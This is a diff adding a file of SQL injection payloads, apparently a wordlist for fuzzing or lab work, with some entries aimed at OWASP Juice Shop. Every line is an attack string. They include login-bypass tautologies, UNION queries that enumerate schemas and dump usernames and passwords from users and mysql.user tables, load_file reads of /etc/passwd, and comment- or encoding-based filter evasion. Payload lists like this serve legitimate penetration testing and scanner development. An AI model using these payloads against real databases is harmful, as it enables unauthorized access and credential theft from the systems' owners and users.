@@ -1,0 +1,232 @@
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+==
+=
+'
+' --
+' #
+' –
+'--
+'/*
+'#
+" --
+" #
+"/*
+' and 1='1
+' and a='a
+ or 1=1
+ or true
+' or ''='
+" or ""="
+1′) and '1′='1–
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+ like '%'
+ or 0=0 --
+ or 0=0 #
+ or 0=0 –
+' or         0=0 #
+' or 0=0 --
+' or 0=0 #
+' or 0=0 –
+" or 0=0 --
+" or 0=0 #
+" or 0=0 –
+%' or '0'='0
+ or 1=1
+ or 1=1--
+ or 1=1/*
+ or 1=1#
+ or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1--
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1′
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1--
+" or 1=1/*
+' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--
+" or 1=1#
+" or 1=1–
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1′='1–
+) or ('1′='1–
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+"or 1=1 or ""="
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT null,version(),null--
+' UNION SELECT null,database(),null--
+' UNION SELECT null,user(),null--
+' UNION SELECT null,@@version,null--
+' UNION SELECT null,@@hostname,null--
+' UNION SELECT null,table_name,null FROM information_schema.tables--
+' UNION SELECT null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema')--
+test'))%20UNION%20SELECT%20username,%20password,%20role,%20deletedAt,%20isActive,%20totpSecret%20AS%20TOTP,%20id,%20email,%20profileImage%20FROM%20USERS--
+' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null,group_concat(column_name),null FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT null,username,password FROM users--
+' UNION SELECT null,concat(username,':',password),null FROM users--
+' UNION SELECT null,concat(id,':',username,':',password),null FROM users--
+' UNION ALL SELECT null,load_file('/etc/passwd'),null--
+' UNION SELECT null,@@datadir,null--
+' UNION SELECT null,@@plugin_dir,null--
+' UNION SELECT null,password,null FROM mysql.user--
+' UNION SELECT null,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
+'/**/UNION/**/SELECT/**/null,null--
+'%0AUNION%0ASELECT%0Anull,null--
+'%09UNION%09SELECT%09null,null--
+'%0DUNION%0DSELECT%0Dnull,null--
+'%0CUNION%0CSELECT%0Cnull,null--
+
